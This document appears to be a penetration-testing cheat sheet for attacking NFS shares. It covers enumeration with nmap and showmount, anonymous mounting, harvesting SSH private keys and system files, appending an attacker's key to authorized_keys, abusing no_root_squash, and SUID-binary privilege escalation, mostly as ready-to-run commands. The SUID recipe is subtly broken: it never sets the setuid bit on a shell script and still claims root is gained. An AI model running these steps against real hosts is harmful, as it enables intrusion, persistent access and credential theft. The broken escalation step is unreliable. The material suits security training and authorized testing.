!!! tip "Start here"
    List exports without credentials: `showmount -e <target>`. If shares are listed, mount and browse immediately: `mount -t nfs <target>:/share /mnt/nfs`. Look for `no_root_squash` in `/etc/exports` — if present, you can drop a SUID binary as root from your attacker machine.

## Enumeration
### Check for Open NFS Ports
```bash
sudo nmap --script="nfs*" <target-ip> -sV -p111,2049
```

Using Showmount:
```bash
showmount -e <target-ip>
```

NOTE: If **"everyone"** or **"no authentication"** is found, the NFS shares are **publicly accessible**.
## Exploiting Misconfigurations
### Mounting Shares (Anonymous Access)
Mount available NFS shares to locally access their content:
Create local directory for mounting share:
```bash
mkdir /mnt/nfs
sudo mount -t nfs <target-ip>:/home/user/public /mnt/nfs
ls -la /mnt/nfs
```

If successful, browse for sensitive files:
```bash
/etc/passwd
/home/user/.ssh/id_rsa
/var/log/auth.log
```
### Insecure File Permissions & Root Squashing
If **`no_root_squash`** is enabled, attackers can write **root-owned files**.
Check NFS config:
```bash
cat /etc/exports
```

If the output contains:
```bash
/home *(rw,no_root_squash)
```
Then root access **is not restricted**.

#### Exploiting No Root Squashing
1. Create a Root-Owned file:
```bash
touch /mnt/nfs/rootfile
chown root:root /mnt/nfs/rootfile
```
2. **Execute Commands as Root** If NFS is used for **system-wide configuration**, modifying certain files (e.g., `/etc/crontab`) could lead to **code execution as root**.
### SSH Key Injection for Remote Access
Insert SSH public key into authorized_keys if `.ssh` directory is accessible:
```bash
echo "<your-public-key>" >> /mnt/share/home/user/.ssh/authorized_keys
```

Then log in directly with SSH.
## Privilege Escalation via Writable NFS Shares
If the NFS share is **writable**, attackers can escalate privileges by uploading a **SUID binary**.
Create the SUID Binary:
```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /mnt/nfs/suid_bin
chmod +x /mnt/nfs/suid_bin
```

On the target machine:
```bash
/mnt/nfs/suid_bin
id
```

If successful, **privileges are escalated** to root.
